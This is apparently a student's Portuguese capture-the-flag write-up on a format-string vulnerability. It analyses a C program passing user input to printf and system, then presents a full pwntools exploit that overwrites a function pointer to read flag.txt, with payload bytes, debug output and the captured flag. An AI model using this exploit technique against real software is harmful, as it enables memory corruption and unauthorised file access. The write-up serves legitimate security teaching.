# CTF Semana #6 (Format Strings)

## Questões iniciais
1. Existe algum ficheiro que é aberto e lido pelo programa?
Sim, o programa lê um ficheiro através da função readtxt. O código que faz isso é:
```
sprintf(command,"cat %s.txt\0",arg);
system(command);
```
Aqui, o nome do ficheiro é passado para o comando cat no sistema. Este comando tenta ler o conteúdo do ficheiro especificado.

2. Existe alguma forma de controlar o ficheiro que é aberto?
Sim, o nome do ficheiro a ser lido é controlado pela entrada do utilizador. O valor fornecido pelo utilizador é passado para a função readtxt através da variável buffer, que é preenchida através de scanf:
`scanf("%99s", &buffer);`
O input do utilizador será então usado como parte do nome do ficheiro. Isso significa que, ao fornecer o valor correto, podemos substituir rules.txt por flag.txt e fazer o programa ler o conteúdo da flag.

3. Existe alguma format string? Se sim, em que é vulnerável e o que podes fazer?
Sim, o código contém uma vulnerabilidade de format string na seguinte linha:
`printf(buffer);`
Aqui, o conteúdo da variável buffer é passado diretamente para printf, o que nos permite fornecer uma string com especificadores de formato como %x ou %n. Isto pode levar à leitura ou escrita arbitrária na pilha de memória. <br>

**Vulnerabilidade:** A ausência de validação do conteúdo de buffer permite que um atacante explore a pilha de memória. Por exemplo: <br>
**Leitura de valores:** Podemos usar %x ou %p para ler valores de memória na pilha.  <br>
**Escrita de valores:** Usando %n, podemos escrever valores na memória, o que pode ser utilizado para sobrescrever variáveis ou alterar o fluxo de execução do programa.


## Exploit

O nosso ficheiro exploit-template.py ficou assim e acrescentamos comentários explicativos:

```
from pwn import *
import re # Biblioteca para trabalhar com expressões regulares


context(arch='i386', log_level='debug')  # Define arquitetura (32 bits) e nível de log

# Função que envia um payload e retorna a resposta
def exec_fmt(payload):
    r = remote('ctf-fsi.fe.up.pt', 4005)  # Conecta ao serviço remoto
    r.sendline(payload) # Envia o payload
    response = r.recvall() # Recebe toda a saída do programa
    r.close() # Fecha a conexão
    return response

# Conecta ao serviço remoto
r = remote('ctf-fsi.fe.up.pt', 4005)

# Recebe a mensagem inicial do programa
output = r.recvuntil(b"flag:\n")
print("Output recebido:", output)

# Procura pelo endereço do ponteiro `fun` na saída usando regex
x = re.search(r"hint: ([a-f0-9]{8})", output.decode("utf-8"))
if x:
    target_adress = int(x.group(1), 16) # Converte o endereço encontrado para inteiro
    print(f"Endereço obtido: {target_adress}:{hex(target_adress)}")

    # Endereço da função readtxt (extraído do binário usando ferramentas como gdb)
    addr_readtxt = 0x080497a5

    # Argumento que será passado à função para substituir "rules" por "flag"
    flag = b'./flag**'

    # Utiliza a ferramenta `FmtStr` para calcular o offset e gerar o payload
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset  # Descobre o offset correto
    payload = flag + fmtstr_payload(offset + int(len(flag) / 4), {target_adress: addr_readtxt}, numbwritten=len(flag)) # Ajusta o offset considerando o tamanho do argumento, define a sobrescrita "fun = addr_readtxt" e considera bytes já escritos pelo argumento.

    # Envia o payload gerado
    r.sendline(payload)
    buf = r.recvall().decode(errors="backslashreplace") # Recebe e decodifica a resposta
    print(buf)
else:
    # Caso o endereço do ponteiro "fun" não seja encontrado
    print("Erro a obter endereço")
r.close() # Fecha a conexão
```

Isto permitiu-nos obter o valor do endereço de hint automaticamente e gerar um payload dinamico consoante os endereços. <br>
Assim, correndo o script o output que obtemos é:
```
[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
[DEBUG] Received 0x68 bytes:
    b'Read the rules.\n'
    b'Running command cat rules.txt\n'
    b'I will give you an hint: ffe9adf0\n'
    b'Try to unlock the flag:\n'
Output recebido: b'Read the rules.\nRunning command cat rules.txt\nI will give you an hint: ffe9adf0\nTry to unlock the flag:\n'
Endereço obtido: 4293504496:0xffe9adf0
[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
[DEBUG] Sent 0x21 bytes:
    b'aaaabaaacaaadaaaeaaaSTART%1$pEND\n'
[+] Receiving all data: Done (218B)
[DEBUG] Received 0xda bytes:
    b'Read the rules.\n'
    b'Running command cat rules.txt\n'
    b'I will give you an hint: ffc134d0\n'
    b'Try to unlock the flag:\n'
    b'aaaabaaacaaadaaaeaaaSTART0x61616161ENDCalling function at 804980c 134518796\n'
    b'Echo aaaabaaacaaadaaaeaaaSTART%1$pEND\n'
[*] Closed connection to ctf-fsi.fe.up.pt port 4005
[*] Found format string offset: 1
[DEBUG] Sent 0x35 bytes:
    00000000  2e 2f 66 6c  61 67 2a 2a  25 31 31 24  68 68 6e 25  │./fl│ag**│%11$│hhn%│
    00000010  31 35 37 63  25 31 32 24  68 68 6e 25  31 30 31 30  │157c│%12$│hhn%│1010│
    00000020  63 25 31 33  24 68 6e 61  f3 ad e9 ff  f0 ad e9 ff  │c%13│$hna│····│····│
    00000030  f1 ad e9 ff  0a                                     │····│·│
    00000035
[+] Receiving all data: Done (1.27KB)
[DEBUG] Received 0x2a bytes:
    b'flag{L34k1ng_Fl4g_0ff_Th3_St4ck_44789C2D}\n'
[DEBUG] Received 0x4e9 bytes:
    00000000  2e 2f 66 6c  61 67 2a 2a  20 20 20 20  20 20 20 20  │./fl│ag**│    │    │
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000a0  20 20 20 20  2e 20 20 20  20 20 20 20  20 20 20 20  │    │.   │    │    │
    000000b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000490  20 20 20 20  20 20 61 61  f3 ad e9 ff  f0 ad e9 ff  │    │  aa│····│····│
    000004a0  f1 ad e9 ff  43 61 6c 6c  69 6e 67 20  66 75 6e 63  │····│Call│ing │func│
    000004b0  74 69 6f 6e  20 61 74 20  38 30 34 39  37 61 35 20  │tion│ at │8049│7a5 │
    000004c0  31 33 34 35  31 38 36 39  33 0a 52 75  6e 6e 69 6e  │1345│1869│3·Ru│nnin│
    000004d0  67 20 63 6f  6d 6d 61 6e  64 20 63 61  74 20 2e 2f  │g co│mman│d ca│t ./│
    000004e0  66 6c 61 67  2e 74 78 74  0a                        │flag│.txt│·│
    000004e9
[*] Closed connection to ctf-fsi.fe.up.pt port 4005
flag{L34k1ng_Fl4g_0ff_Th3_St4ck_44789C2D}
./flag**                                                                                                                                                            .                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 aa\xf3\xad\xe9\xff\xf0\xad\xe9\xff\xf1\xad\xe9\xffCalling function at 80497a5 134518693
Running command cat ./flag.txt
```

No fim, extraímos a flag{L34k1ng_Fl4g_0ff_Th3_St4ck_44789C2D}.